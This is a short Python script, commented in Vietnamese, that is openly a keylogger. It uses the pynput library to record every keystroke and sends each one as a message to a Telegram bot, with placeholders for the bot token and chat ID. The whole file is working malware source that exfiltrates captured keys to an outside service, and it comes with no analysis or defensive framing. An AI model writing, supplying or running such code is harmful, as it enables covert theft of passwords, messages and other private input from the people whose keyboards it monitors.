import requests
from pynput import keyboard
import time

# Cấu hình Telegram Bot
BOT_TOKEN = "<YOUR_BOT_TOKEN>"  # Thay bằng token bot của bạn
CHAT_ID = "<YOUR_CHAT_ID>"      # Thay bằng chat ID của bạn

def send_to_telegram(text):
    """Hàm gửi tin nhắn đến Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        response = requests.post(url, data=data)
        if response.status_code != 200:
            print(f"Failed to send message: {response.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

def on_press(key):
    """Hàm xử lý khi nhấn phím"""
    try:
        # Gửi tên phím bấm đến Telegram
        text = f"Key pressed: {key.char}"
    except AttributeError:
        # Nếu là phím đặc biệt (Ctrl, Alt, v.v.)
        text = f"Special key pressed: {key}"
    
    print(text)  # Hiển thị ra màn hình
    send_to_telegram(text)  # Gửi đến Telegram

# Chạy keylogger
print("Keylogger is running. Press Ctrl+C to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
